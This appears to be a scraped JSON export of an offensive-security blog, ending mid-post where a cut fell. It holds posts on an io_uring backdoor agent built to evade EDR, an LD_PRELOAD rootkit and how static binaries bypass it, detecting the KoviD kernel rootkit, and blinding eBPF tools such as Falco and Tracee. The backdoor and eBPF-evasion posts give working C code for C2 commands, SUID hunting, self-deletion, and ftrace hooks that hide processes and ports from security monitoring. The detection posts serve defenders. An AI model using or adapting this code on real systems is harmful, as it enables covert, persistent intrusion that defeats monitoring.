\u0026#34;/usr/bin/%s\u0026#34;, entry-\u0026gt;d_name); struct io_uring_sqe *sqe = io_uring_get_sqe(ring); struct io_uring_cqe *cqe; struct statx stx; io_uring_prep_statx(sqe, AT_FDCWD, path, 0, STATX_ALL, \u0026amp;stx); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); if (cqe-\u0026gt;res == 0 \u0026amp;\u0026amp; (stx.stx_mode \u0026amp; S_ISUID)) { pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;%s\\n\u0026#34;, path); if (pos \u0026gt; sizeof(out) - 100) break; } io_uring_cqe_seen(ring, cqe); } closedir(dir); send_all(ring, sockfd, out, pos); } This function scans the /usr/bin directory looking for binaries that have the SUID bit enabled, which could be privilege escalation vectors (privesc). For each binary, it does a statx via io_uring and checks the SUID flag. The result is formatted and sent to the client, listing possible privilege exploit candidates.\ncmd_selfdestruct:\nvoid cmd_selfdestruct(struct io_uring *ring, int sockfd) { const char *msg = \u0026#34;Agent will self-destruct\\n\u0026#34;; send_all(ring, sockfd, msg, strlen(msg)); char exe_path[512]; ssize_t len = readlink(\u0026#34;/proc/self/exe\u0026#34;, exe_path, sizeof(exe_path)-1); if (len \u0026gt; 0) { exe_path[len] = \u0026#39;\\0\u0026#39;; struct io_uring_sqe *sqe = io_uring_get_sqe(ring); struct io_uring_cqe *cqe; io_uring_prep_unlinkat(sqe, AT_FDCWD, exe_path, 0); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); if (cqe-\u0026gt;res \u0026lt; 0) { char err[128]; snprintf(err, sizeof(err), \u0026#34;Unlink failed: %s\\n\u0026#34;, strerror(-cqe-\u0026gt;res)); send_all(ring, sockfd, err, strlen(err)); } io_uring_cqe_seen(ring, cqe); } exit(0); } How Does the EDR Typically Fail Here? A standard EDR intercepts:\nCalls to open Calls to connect Calls to read and write This monitoring is usually done via hooks or eBPF. What this agent does is \u0026ldquo;bypass\u0026rdquo; these direct calls using io_uring. The kernel handles the I/O without exposing each syscall individually, generating far fewer events to be audited.\nIn essence, the EDR sees fewer \u0026ldquo;door knocks\u0026rdquo; because io_uring sends a batch of operations to the kernel and receives the responses in bulk. This strategy generates much less noise and makes it easier to go unnoticed.\nPractical EDR Bypass With this agent, virtually all network and file operations are handled through io_uring.\nSo an EDR would need to monitor io_uring_enter and understand the full submission/completion flow of events to identify behavior — which is still uncommon in most commercial solutions.\nAdditionally, the traffic goes through a standard HTTPS port (443), making it harder to separate legitimate from malicious traffic.\nBelow is a screenshot from an environment running EDR:\nRingReaper is currently completely FUD (Fully Undetectable) to some EDRs at the time of writing this article. You can do anything, exfiltrate data, read /etc/shadow, access sensitive files, upload content, all RingReaper features remain fully undetected by some EDRs, with evasion working flawlessly.\nPython C2 Server Flow The server.py is quite straightforward:\nWaits for a connection Receives commands from a terminal Sends them to the agent Displays the response It also supports file uploads (put), basically by informing the file size and sending the content sequentially, so the backdoor can reconstruct the file on the target.\nDefensive Reflections As much as using io_uring to bypass defenses is a clever idea;\nThere’s no magic:\nThe kernel still has to execute the io_uring operations. In theory, a well-designed EDR could hook io_uring_enter or instrument internal calls like __io_uring_submit.\neBPF (Berkeley Packet Filter) could be used to trace these operations, but the reality is that few products today deeply monitor io_uring-related syscalls.\nIt’s essential that defenders become familiar with this kind of technique, as it’s likely to become increasingly popular in advanced Linux malware.\nConclusion This agent demonstrates that io_uring, a legitimate Linux feature, can be repurposed to evade syscall-based security solutions.\nIts asynchronous control level enables the construction of discreet, fast, and much harder-to-detect backdoors.\nFor red teamers, t shows the power of modern evasion techniques.\nFor defenders, the takeaway is clear: start studying hooks for io_uring, because it’s only a matter of time before this becomes mainstream in the Linux malware landscape.\nJoin in rootkit researchers\nhttps://discord.gg/66N5ZQppU7 ","permalink":"http://localhost:1313/hacking/evading-linux-edrs-with-io-uring/","summary":"\u003cp\u003eFull source: \u003ca href=\"https://github.com/MatheuZSecurity/RingReaper\"\u003ehttps://github.com/MatheuZSecurity/RingReaper\u003c/a\u003e\u003c/p\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#what-is-io_uring\"\u003eWhat is io_uring?\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#the-agent\"\u003eThe Agent\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#code-analysis\"\u003eCode Analysis\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#how-does-the-edr-typically-fail-here\"\u003eHow Does the EDR Typically Fail Here?\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#practical-edr-bypass\"\u003ePractical EDR Bypass\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#python-c2-server-flow\"\u003ePython C2 Server Flow\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#defensive-reflections\"\u003eDefensive Reflections\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eEach year, new security solutions emerge to protect Linux systems against increasingly sophisticated threats. Technologies such as \u003ccode\u003eEDR (Endpoint Detection and Response)\u003c/code\u003e evolve rapidly, making the work of an attacker more challenging.\u003c/p\u003e\n\u003cp\u003eWe, as \u003cstrong\u003ered teamers\u003c/strong\u003e, we need to stay one step ahead, seeking to understand not only the defenses, but also how to creatively circumvent them.\u003c/p\u003e","title":"Red Team Tactics: Evading EDR on Linux with io_uring"},{"content":" Introduction In this post, I\u0026rsquo;m going to get into a really cool topic, which is how to bypass the hooks used by LD_PRELOAD rootkits, a technique that is effective against most, if not all, of them.\nLD_PRELOAD LD_PRELOAD is an environment variable used by dynamic linkers on Unix-like systems (such as /lib64/ld-linux-x86-64.so.2 on x86_64 Linux) to force specific shared libraries to be loaded before any others during program execution.\nThis technique allows you to \u0026ldquo;hook\u0026rdquo; functions from standard libraries, such as libc, without modifying the program binary, and is therefore widely used both for debugging and for offensive techniques such as user space rootkits.\nWhen an ELF binary is executed, the dynamic linker resolves external function calls using structures like the Procedure Linkage Table (PLT) and Global Offset Table (GOT). By preloading a custom library via LD_PRELOAD, attackers can override functions like readdir() or fopen().\nExample:\nLD_PRELOAD=./rootkitresearchers.so ls /etc/ld.so.preload\nBesides the environment variable, the /etc/ld.so.preload file can also be used to persistently load a library into all processes on the system (including root). This file is read before any environment variable.\nInstalling and Hiding Directory with Rootkit To demonstrate this, I\u0026rsquo;ll use a simple LD_PRELOAD rootkit that hooks the readdir, readdir64, and fopen functions to change the behavior of file and directory listings. The code is shown below.\nFull source\nstruct dirent *(*orig_readdir)(DIR *dirp); struct dirent *readdir(DIR *dirp) { if (!orig_readdir) orig_readdir = dlsym(RTLD_NEXT, \u0026#34;readdir\u0026#34;); struct dirent *entry; while ((entry = orig_readdir(dirp)) != NULL) { if (strcmp(entry-\u0026gt;d_name, HIDDEN_DIR) != 0 \u0026amp;\u0026amp; strcmp(entry-\u0026gt;d_name, HIDDEN_FILE) != 0) { return entry; } } return NULL; } This snippet above hooks into the readdir function, which is responsible for listing files in a directory. It uses a pointer orig_readdir to store the address of the original function, retrieved with dlsym(RTLD_NEXT, \u0026ldquo;readdir\u0026rdquo;). Then, in a loop, it calls the original function to get each entry in the directory, but filters out (ignores) entries whose name is equal to \u0026ldquo;secret\u0026rdquo; or \u0026ldquo;ld.so.preload\u0026rdquo;. Thus, these entries never appear to the program that called readdir. When there are no more visible entries, it returns NULL.\nstruct dirent64 *(*orig_readdir64)(DIR *dirp); struct dirent64 *readdir64(DIR *dirp) { if (!orig_readdir64) orig_readdir64 = dlsym(RTLD_NEXT, \u0026#34;readdir64\u0026#34;); struct dirent64 *entry; while ((entry = orig_readdir64(dirp)) != NULL) { if (strcmp(entry-\u0026gt;d_name, HIDDEN_DIR) != 0 \u0026amp;\u0026amp; strcmp(entry-\u0026gt;d_name, HIDDEN_FILE) != 0) { return entry; } } return NULL; } This is the same logic but for the 64-bit version readdir64.\nFILE *(*orig_fopen)(const char *pathname, const char *mode); FILE *fopen(const char *pathname, const char *mode) { if (!orig_fopen) orig_fopen = dlsym(RTLD_NEXT, \u0026#34;fopen\u0026#34;); if (strstr(pathname, HIDDEN_FILE) != NULL) { errno = ENOENT; return NULL; } return orig_fopen(pathname, mode); } This fopen hook hides access to specific files by returning a ‘file not found’ error (ENOENT) if the path contains keywords like ‘ld.so.preload’.\nNow let\u0026rsquo;s compile and load it into /etc/ld.so.preload\nOnce loaded, we can test creating a directory named secret, and see if it is hidden from ls.\nAs expected, it was hidden from ls.\n[Theory] Breaking LD_PRELOAD rootkits Here’s something interesting: rootkits that use the LD_PRELOAD technique depend ENTIRELY on the Linux dynamic loader (ld-linux.so) to \u0026ldquo;inject\u0026rdquo; their malicious libraries before the standard system libraries, such as libc. But does this work with all programs?\nThe short and quick answer is: No!\nWhy does LD_PRELOAD work, and why does it sometimes not work?\nLD_PRELOAD, as explained in previous topics, is an environment variable used by ld-linux.so to load extra libraries before others, which allows it to intercept functions from standard libraries (such as libc). In other words, you can replace system functions, such as those that list files or open files, with customized versions, which is perfect for hiding directories or files, for example.\nBut for this to work, the program has to use dynamic loading and depend on ld-linux.so to resolve these functions.\nWhy do static binaries break this idea?\nStatically linked binaries are \u0026ldquo;self-contained\u0026rdquo;. They incorporate all necessary code from their dependencies (such as libc) directly into the executable. As a result, they do not invoke the dynamic linker at runtime, so LD_PRELOAD and /etc/ld.so.preload are ignored.\nIn other words, LD_PRELOAD and the /etc/ld.so.preload file are simply not used by these binaries. This means that rootkits based on these techniques have no effect on them, practically useless.\nThis is one of the most effective ways to bypass these rootkits.\n[Practice] Breaking LD_PRELOAD rootkits With the rootkit loaded in /etc/ld.so.preload, the secret directory is hidden from commands like ls, which depend on libc and the dynamic loader.\nBut it is easy to bypass this, for example: just compile a static binary, like a simple getdents64.c\ngcc getdents64.c -o getdents64 \u0026ndash;static\nWhen using ldd getdents64, we will see that it does not load any dynamic dependencies, unlike ldd /bin/ls, which depends on libc. Since static binaries do not use the dynamic linker, LD_PRELOAD is completely ignored, and so is the rootkit.\nBypassing LD_PRELOAD rootkits is simply very easy.\nConclusion LD_PRELOAD rootkits are actually very good at hiding artifacts in user space, especially because of their simplicity and the fact that they are more stable than LKM rootkits. However, as we have shown in this post, they are not infallible. Simple techniques, such as the use of static binaries, can easily bypass the hooks applied by the rootkit, precisely because they do not depend on the dynamic loader and the external libc.\nIf you enjoyed this content and want to discuss similar techniques, feel free to join our Discord community. See you next time!\nRootkit Researchers\nhttps://discord.gg/66N5ZQppU7\n","permalink":"http://localhost:1313/hacking/bypass-userland-hooks/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/JhWCyVT.png\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this post, I\u0026rsquo;m going to get into a really cool topic, which is how to bypass the hooks used by LD_PRELOAD rootkits, a technique that is effective against most, if not all, of them.\u003c/p\u003e\n\u003ch2 id=\"ld_preload\"\u003eLD_PRELOAD\u003c/h2\u003e\n\u003cp\u003e\u003ccode\u003eLD_PRELOAD\u003c/code\u003e is an environment variable used by dynamic linkers on Unix-like systems (such as /lib64/ld-linux-x86-64.so.2 on x86_64 Linux) to force specific shared libraries to be loaded before any others during program execution.\u003c/p\u003e","title":"Bypassing LD_PRELOAD Rootkits Is Easy"},{"content":" Hello everyone, welcome to this post where I will cover the easiest way on how to detect and remove LKM KoviD rootkit.\nBut first of all, we need to understand how the KoviD works.\nWhat is KoviD? KoviD is a Linux kernel rootkit, containing several features that make it difficult to detect and remove, in my opinion KoviD is the best open source LKM rootkit today, you can see more about it on github.\nNow that we know what KoviD is, we can analyze its code and see how it works, for example, which hooking method it uses.\nFtrace hooking Looking at KoviD sys.c, we can see that it uses a very famous method for hooking syscalls that works very well on newer kernels, which is ftrace (function tracer).\nKeep this information, it will be very useful later in this post.\nSetup KoviD and Loading. According to the kovid readme, before compiling, we need to edit the Makefile to choose a unique file name for \u0026ldquo;/proc/name\u0026rdquo;.\nAfter compiling using make, we can insert it using insmod kovid.ko.\nAfter inserting it, we can see that /proc/mtz had not been enabled and also the module was not hidden after its insertion, so first it is necessary to enable /proc/mtz using kill -SIGCONT 31337 and after that, hide the LKM from lsmod using echo -h \u0026gt;/proc/mtz.\nI also hid the file containing the name mtz, making it invisible in /proc/.\nWell, after enabling /proc/mtz, we can look in dmesg that a random magic word was generated, and this magic word is used to make KoviD visible again.\nIn kovid.c we can see this magic word function being called to make the module visible again.\nDetecting KoviD Well, luckily for us, there is a filesystem that is not very well known, which is tracing, normally on more up-to-date systems, it is already mounted by default, if tracefs is not mounted, just mount it using mount -t tracefs nodev /sys/kernel/tracing, and you can find its documentation at kernel.org.\nAnd in it we can simply view all the LKM functions that are loaded on the machine.\nA very interesting curiosity is that when Kovid is invisible, the trace only shows the addresses of each Kovid function (which in my head still doesn\u0026rsquo;t make much sense, since the /sys/kernel/tracing/available_filter_functions_addrs file was only added in kernel 6.5x, in it we can view the addresses of each function of each loaded lkm too and I am using kernel 5.15.0-119-generic for testing).\nNow, if we make kovid visible again, the name of its functions will appear.\nThis is a very simple way to detect KoviD, and it doesn\u0026rsquo;t require much effort.\nHowever, there is still a way to hide any function/LKM from the tracefs file system, so don\u0026rsquo;t be fooled by that and don\u0026rsquo;t think that if you didn\u0026rsquo;t find anything there that you are safe. Maybe I\u0026rsquo;ll talk about this in a future post.\nYou can also use nitara2 to detect KoviD.\nMaking KoviD hooks useless This part is very interesting and you will learn a really cool trick (if you didn\u0026rsquo;t already know).\nRemember when I mentioned at the beginning of the post that KoviD uses ftrace as a hooking method? So, many people may not know that there is a way to disable ftrace with just one command.\necho 0 \u0026gt; /proc/sys/kernel/ftrace_enabled or sysctl kernel.ftrace_enabled=0 Okay, but what\u0026rsquo;s so great about that? Well, let\u0026rsquo;s go!\nBy temporarily disabling ftrace, all kovid hooks stop working, as it uses ftrace for hooking, but this still does not make kovid visible, but it makes it useless.\nKoviD hides the file containing the name mtz, so /proc/mtz is hidden, and in it is the magic word to make LKM visible again.\nWell now with ftrace disabled we can see that the hidden /proc/mtz has become visible as no kovid hook works as it uses ftrace as syscalls hook.\nSo, after disabling ftrace, just go to /proc/mtz that was visible, get the magic word, and make LKM visible again, being able to remove it.\nAnd this is the easiest way to detect/remove KoviD.\nNotes 1- Of course, this is not 100% effective, as it has a way of hiding from the tracefs filesystem, but against KoviD so far, this works perfectly.\n2- And it is also obvious that in a real scenario, if someone is using KoviD, the name in /proc/name will not be something common like mtz, they would probably use a name that is less \u0026ldquo;imperceptible\u0026rdquo;.\n3- You can make any LKM rootkit that uses ftrace as hooking completely useless, and when you make it useless, you can use that to your advantage and analyze the compromised environment, looking for hidden PIDs, directories/files, etc.\nFinal consideration I hope you enjoyed this post and learned something, if you have any questions, please DM me on Twitter.\n","permalink":"http://localhost:1313/hacking/a-simple-way-to-detect-and-remove-kovid-lkm-rootkit/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/Xd3Y153.jpeg\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eHello everyone, welcome to this post where I will cover the easiest way on how to detect and remove LKM KoviD rootkit.\u003c/p\u003e\n\u003cp\u003eBut first of all, we need to understand how the KoviD works.\u003c/p\u003e\n\u003ch2 id=\"what-is-kovid\"\u003eWhat is KoviD?\u003c/h2\u003e\n\u003cp\u003eKoviD is a Linux kernel rootkit, containing several features that make it difficult to detect and remove, in my opinion KoviD is the best open source LKM rootkit today, you can see more about it on \u003ca href=\"https://github.com/carloslack/KoviD\"\u003egithub\u003c/a\u003e.\u003c/p\u003e","title":"A simple way to detect and remove LKM rootkit KoviD (Outdated)"},{"content":"Stealthy Kernel Rootkit: https://github.com/MatheuZSecurity/Singularity\nRootkit Researchers: https://discord.gg/66N5ZQppU7\nMe: https://www.linkedin.com/in/mathsalves/\nIntroduction Linux security tooling has leaned heavily into eBPF. Projects like Falco, Tracee, and Tetragon made kernel-level telemetry feel like a step change: richer context, low overhead, and visibility that’s difficult to evade from user space.\nBut that promise quietly depends on a threat model: the kernel is assumed to be a trustworthy observer.\nThis article explores what happens when that assumption breaks, specifically, when an attacker can execute code in the kernel (e.g., via a loaded module). In that world, the most valuable targets aren’t the eBPF programs themselves, but the plumbing around them: iterators, event delivery paths (ring buffer / perf buffer), perf submission, and map operations that turn kernel activity into user-space signals.\nAll research is strictly for educational purposes.\nTable of Contents Introduction The eBPF Security Landscape How eBPF Security Works The False Promise of Kernel Observability Understanding the Attack Surface BPF Iterators BPF Ringbuffers Perf Events BPF Maps Bypassing eBPF Security: Technical Implementation Hook Architecture Process and Network Hiding Intercepting BPF Iterators Filtering Ringbuffer Events Blocking Perf Event Submission Manipulating BPF Maps Real-World Bypass Results Falco Evasion Tracee Evasion Additional Tools Conclusion The eBPF Security Landscape How eBPF Security Works eBPF (extended Berkeley Packet Filter) has revolutionized Linux observability and security. Modern security tools leverage eBPF to monitor kernel events in real-time without modifying kernel code or loading traditional kernel modules.\nKey Components:\neBPF Programs: Sandboxed code running in kernel context, attached to various kernel events (syscalls, tracepoints, kprobes) BPF Maps: Kernel data structures for sharing information between eBPF programs and userspace Ringbuffers/Perf Events: Efficient mechanisms for streaming event data from kernel to userspace BPF Iterators: New mechanism for efficiently iterating over kernel objects (processes, network connections, etc.) Security Tools Using eBPF:\nFalco: Runtime security monitoring, detects anomalous behavior Tracee: System call and event tracing for security analysis Tetragon: Policy enforcement and security observability Cilium: Network security and observability GhostScan: Rootkit detection via memory scanning Decloaker: Hidden process detection The False Promise of Kernel Observability The security community believed eBPF solved a fundamental problem: how do you monitor a system that an attacker controls? The answer seemed obvious: use kernel-level observability that attackers cannot evade.\nThis assumption contains a critical flaw.\nThe Fundamental Problem:\neBPF programs execute inside the kernel they are trying to observe, while the detection pipeline depends on kernel → userspace delivery (ring buffers/perf buffers/iterators) and userspace policy engines. If an attacker gains the ability to load a kernel module (via root access and disabled Secure Boot / unenforced module signing), they can modify the kernel\u0026rsquo;s behavior and selectively disrupt what those eBPF programs and collectors are able to see.\nWhy This Matters:\neBPF programs cannot protect themselves from kernel-level manipulation eBPF verifier only ensures memory safety, not security guarantees All eBPF data flow mechanisms (iterators, ringbuffers, maps) are implemented as kernel functions Kernel functions can be hooked via ftrace The moment an attacker has kernel-level access, observability becomes optional.\nUnderstanding the Attack Surface Before we can bypass eBPF security, we need to understand how these tools collect data. Let\u0026rsquo;s examine each mechanism.\nBPF Iterators BPF iterators allow eBPF programs to efficiently walk kernel data structures. Security tools use iterators to enumerate processes, network connections, and other kernel objects.\nIterator Flow:\nKernel Data (tasks, sockets) -\u0026gt; bpf_iter_run_prog() -\u0026gt; eBPF iterator program -\u0026gt; bpf_seq_write() / bpf_seq_printf() -\u0026gt; Userspace reads via seq_file Key Functions:\nbpf_iter_run_prog(): Executes the eBPF iterator program for each kernel object bpf_seq_write(): Writes data to the seq_file buffer bpf_seq_printf(): Formatted output to seq_file buffer Security Tools Using Iterators:\nGhostScan uses task iterators to detect hidden processes Decloaker uses network iterators to find hidden connections Custom security tools use iterators for forensic analysis BPF Ringbuffers Ringbuffers are the modern replacement for perf buffers, providing efficient event streaming from kernel to userspace with better performance and ordering guarantees.\nRingbuffer Flow:\nKernel Event -\u0026gt; eBPF program -\u0026gt; bpf_ringbuf_reserve() -\u0026gt; bpf_ringbuf_submit() or bpf_ringbuf_output() -\u0026gt; Userspace reads events Key Functions:\nbpf_ringbuf_reserve(): Allocates space in the ringbuffer bpf_ringbuf_submit(): Commits reserved data to the ringbuffer bpf_ringbuf_output(): One-shot write to ringbuffer Security Tools Using Event Delivery Mechanisms:\nFalco (modern eBPF probe): Uses BPF ring buffer (BPF_MAP_TYPE_RINGBUF) for kernel→userspace event delivery (driver/config dependent). Tracee: Uses perfbuffer/perf ring buffers as its primary kernel→userspace event delivery mechanism (and can vary by version/implementation). Tetragon: Uses kernel→userspace buffering mechanisms (e.g., ring buffer / perf-based buffers) depending on the component and version. Note: \u0026ldquo;Perf event arrays\u0026rdquo; and \u0026ldquo;BPF ring buffers\u0026rdquo; are different mechanisms - the former is per-CPU and older, while the latter is shared across CPUs and more efficient.\nPerf Events Perf events are the traditional mechanism for streaming kernel data to userspace. While older than ringbuffers, many tools still use them.\nPerf Event Flow:\nKernel Event -\u0026gt; eBPF program -\u0026gt; perf_event_output() -\u0026gt; perf_trace_run_bpf_submit() -\u0026gt; Userspace reads perf buffer Key Functions:\nperf_event_output(): Writes event to perf buffer perf_trace_run_bpf_submit(): Submits tracepoint data to eBPF programs Security Tools Using Perf Events:\nLegacy Falco versions Custom monitoring tools Kernel tracing utilities BPF Maps BPF maps are kernel data structures that store state and allow communication between eBPF programs and userspace.\nMap Operations:\neBPF program or userspace -\u0026gt; bpf_map_lookup_elem() -\u0026gt; bpf_map_update_elem() -\u0026gt; bpf_map_delete_elem() -\u0026gt; Kernel map data structure Key Functions:\nbpf_map_lookup_elem(): Retrieve value from map bpf_map_update_elem(): Insert or update map entry bpf_map_delete_elem(): Remove map entry Security Use Cases:\nStoring process metadata Tracking network connections Maintaining allow/deny lists Sharing data between eBPF programs Bypassing eBPF Security: Technical Implementation Now that we understand how eBPF security works, let\u0026rsquo;s examine how to systematically blind it.\nHook Architecture Our approach uses ftrace to hook critical BPF functions. Ftrace allows dynamic tracing of kernel functions without modifying kernel code, making it perfect for interception.\nHooked Functions:\nstatic struct ftrace_hook hooks[] = { // BPF Iterator Hooks HOOK(\u0026#34;bpf_iter_run_prog\u0026#34;, hook_bpf_iter_run_prog, \u0026amp;orig_bpf_iter_run_prog), HOOK(\u0026#34;bpf_seq_write\u0026#34;, hook_bpf_seq_write, \u0026amp;orig_bpf_seq_write), HOOK(\u0026#34;bpf_seq_printf\u0026#34;, hook_bpf_seq_printf, \u0026amp;orig_bpf_seq_printf), // BPF Ringbuffer Hooks HOOK(\u0026#34;bpf_ringbuf_output\u0026#34;, hook_bpf_ringbuf_output, \u0026amp;orig_bpf_ringbuf_output), HOOK(\u0026#34;bpf_ringbuf_reserve\u0026#34;, hook_bpf_ringbuf_reserve, \u0026amp;orig_bpf_ringbuf_reserve), HOOK(\u0026#34;bpf_ringbuf_submit\u0026#34;, hook_bpf_ringbuf_submit, \u0026amp;orig_bpf_ringbuf_submit), // BPF Map Hooks HOOK(\u0026#34;bpf_map_lookup_elem\u0026#34;, hook_bpf_map_lookup_elem, \u0026amp;orig_bpf_map_lookup_elem), HOOK(\u0026#34;bpf_map_update_elem\u0026#34;, hook_bpf_map_update_elem, \u0026amp;orig_bpf_map_update_elem), // Perf Event Hooks HOOK(\u0026#34;perf_event_output\u0026#34;, hook_perf_event_output, \u0026amp;orig_perf_event_output), HOOK(\u0026#34;perf_trace_run_bpf_submit\u0026#34;, hook_perf_trace_run_bpf_submit, \u0026amp;orig_perf_trace_run_bpf_submit), // BPF Program Execution HOOK(\u0026#34;__bpf_prog_run\u0026#34;, hook_bpf_prog_run, \u0026amp;orig_bpf_prog_run), // BPF Syscall HOOK(\u0026#34;__x64_sys_bpf\u0026#34;, hook_bpf, \u0026amp;orig_bpf), HOOK(\u0026#34;__ia32_sys_bpf\u0026#34;, hook_bpf_ia32, \u0026amp;orig_bpf_ia32), }; Why This Works:\nKernel-level access: Once loaded, the rootkit runs at ring 0 with full privileges Ftrace hooking: Operates below eBPF programs, allowing us to filter their data sources No eBPF involvement: We\u0026rsquo;re not fighting eBPF, we\u0026rsquo;re cutting off its inputs Selective filtering: Only hide specific processes/connections, not everything Process and Network Hiding The rootkit maintains lists of hidden PIDs and network connections. Child process tracking ensures that when you hide a shell, all spawned processes also remain hidden.\nHidden PID Management:\n#define MAX_HIDDEN_PIDS 32 #define MAX_CHILD_PIDS (MAX_HIDDEN_PIDS * 128) extern int hidden_pids[MAX_HIDDEN_PIDS]; extern int hidden_count; extern int child_pids[MAX_CHILD_PIDS]; extern int child_count; notrace void add_hidden_pid(int pid) { int i; for (i = 0; i \u0026lt; hidden_count; i++) { if (hidden_pids[i] == pid) return; } if (hidden_count \u0026lt; MAX_HIDDEN_PIDS) { hidden_pids[hidden_count++] = pid; } } notrace int is_hidden_pid(int pid) { int i; for (i = 0; i \u0026lt; hidden_count; i++) { if (hidden_pids[i] == pid) return 1; } return 0; } Child Process Tracking:\nstatic notrace bool is_child_of_hidden_process(int pid) { struct task_struct *task; struct task_struct *parent; int depth = 0; int max_depth = 10; bool hidden = false; if (pid \u0026lt;= 0) return false; if (should_hide_pid_by_int(pid)) return true; rcu_read_lock(); task = pid_task(find_vpid(pid), PIDTYPE_PID); if (!task) { rcu_read_unlock(); return false; } parent = task; while (parent \u0026amp;\u0026amp; depth \u0026lt; max_depth) { if (parent-\u0026gt;pid \u0026lt;= 0) break; parent = rcu_dereference(parent-\u0026gt;real_parent); if (!parent || parent-\u0026gt;pid \u0026lt;= 1) break; if (should_hide_pid_by_int(parent-\u0026gt;pid)) { hidden = true; break; } depth++; } rcu_read_unlock(); return hidden; } Network Connection Hiding:\n#define HIDDEN_PORT 8081 static notrace bool should_hide_socket_port(struct sock_common *sk) { __be16 sport, dport; __be32 saddr, daddr; if (!sk) return false; init_hidden_ip(); if (sk-\u0026gt;skc_family == AF_INET) { sport = sk-\u0026gt;skc_num; dport = sk-\u0026gt;skc_dport; saddr = sk-\u0026gt;skc_rcv_saddr; daddr = sk-\u0026gt;skc_daddr; if (sport == HIDDEN_PORT || ntohs(dport) == HIDDEN_PORT) { if (saddr == hidden_ip_cached || daddr == hidden_ip_cached || saddr == htonl(INADDR_ANY) || daddr == htonl(INADDR_ANY)) { return true; } } } else if (sk-\u0026gt;skc_family == AF_INET6) { sport = sk-\u0026gt;skc_num; if (sport == HIDDEN_PORT) { return true; } } return false; } Intercepting BPF Iterators BPF iterators allow tools like GhostScan and Decloaker to enumerate kernel objects. By hooking the iterator execution, we can selectively filter results.\nIterator Context Structures:\nstruct bpf_iter_ctx_tcp { struct bpf_iter_meta *meta; struct sock_common *sk_common; uid_t uid; }; struct bpf_iter_ctx_udp { struct bpf_iter_meta *meta; struct udp_sock *udp_sk; uid_t uid; int bucket; }; struct bpf_iter_ctx_task { struct bpf_iter_meta *meta; struct task_struct *task; }; Hooking bpf_iter_run_prog:\nstatic notrace int hook_bpf_iter_run_prog(struct bpf_prog *prog, void *ctx) { struct bpf_iter_ctx_tcp *tcp_ctx; struct bpf_iter_ctx_udp *udp_ctx; struct bpf_iter_ctx_task *task_ctx; struct sock_common *sk; struct udp_sock *udp_sk; struct task_struct *task; if (!orig_bpf_iter_run_prog || !ctx) goto passthrough; // Check if this is a TCP socket iterator tcp_ctx = (struct bpf_iter_ctx_tcp *)ctx; if (tcp_ctx \u0026amp;\u0026amp; tcp_ctx-\u0026gt;sk_common) { sk = tcp_ctx-\u0026gt;sk_common; if ((unsigned long)sk \u0026gt; PAGE_SIZE) { if (should_hide_socket_port(sk)) { return 0; // Skip this socket } } } // Check if this is a UDP socket iterator udp_ctx = (struct bpf_iter_ctx_udp *)ctx; if (udp_ctx \u0026amp;\u0026amp; udp_ctx-\u0026gt;udp_sk) { udp_sk = udp_ctx-\u0026gt;udp_sk; if ((unsigned long)udp_sk \u0026gt; PAGE_SIZE) { sk = \u0026amp;udp_sk-\u0026gt;inet.sk.__sk_common; if (should_hide_socket_port(sk)) { return 0; // Skip this socket } } } // Check if this is a task iterator task_ctx = (struct bpf_iter_ctx_task *)ctx; if (task_ctx \u0026amp;\u0026amp; task_ctx-\u0026gt;task) { task = task_ctx-\u0026gt;task; if ((unsigned long)task \u0026gt; PAGE_SIZE \u0026amp;\u0026amp; task-\u0026gt;pid \u0026gt; 0) { if (is_child_of_hidden_process(task-\u0026gt;pid)) { return 0; // Skip this task } } } passthrough: return orig_bpf_iter_run_prog(prog, ctx); } How This Defeats Detection:\nWhen GhostScan or Decloaker use BPF iterators to enumerate processes or network connections, our hook intercepts each iteration. For hidden PIDs or network connections, we return 0 (skip), preventing the eBPF program from ever seeing that object. The security tool thinks it\u0026rsquo;s seeing the complete system state, but we\u0026rsquo;ve selectively filtered the view.\nHooking seq_file Output:\nIterators also use bpf_seq_write() and bpf_seq_printf() to format output. We hook these too:\nstatic notrace int hook_bpf_seq_write(struct seq_file *seq, const void *data, u32 len) { const u32 *pid_data; int i; if (!orig_bpf_seq_write) return -ENOSYS; if (!data || len \u0026lt; sizeof(u32)) goto passthrough; // Scan the data for PIDs pid_data = (const u32 *)data; for (i = 0; i \u0026lt; (len / sizeof(u32)) \u0026amp;\u0026amp; i \u0026lt; 16; i++) { u32 potential_pid = pid_data[i]; if (potential_pid \u0026gt; 0 \u0026amp;\u0026amp; potential_pid \u0026lt; 4194304) { if (is_child_of_hidden_process((int)potential_pid)) { return 0; // Block this write } } } passthrough: return orig_bpf_seq_write(seq, data, len); } Filtering Ringbuffer Events Falco and Tracee heavily rely on ringbuffers for event streaming. By hooking ringbuffer operations, we can prevent events related to our processes from reaching userspace.\nFalco Event Structure:\nstruct falco_event_hdr { u64 ts; u64 tid; u32 len; u16 type; u32 nparams; } __attribute__((packed)); static notrace bool is_falco_event(void *data, u64 size) { struct falco_event_hdr *hdr; if (!data || size \u0026lt; sizeof(struct falco_event_hdr)) return false; hdr = (struct 